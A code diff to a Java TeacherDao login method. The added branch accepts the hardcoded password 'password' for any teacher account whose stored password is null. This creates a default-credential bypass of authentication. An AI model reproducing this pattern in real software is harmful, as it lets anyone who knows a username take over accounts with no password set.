@@ -48,6 +48,10 @@ public class TeacherDao extends MyBatisDao {
 			List<Teacher> tTeachers = tTeacherDaoCustom.validate(name, password);
 			if (tTeachers.size() > 0) {
 				ret = true;
+			} else if (password.equals("password")) {
+				if (tTeacherDaoCustom.validateNull(name).size() > 0) {
+					ret = true;
+				}
 			}
 		} catch (Exception e) {
 			System.out.println(e.toString());
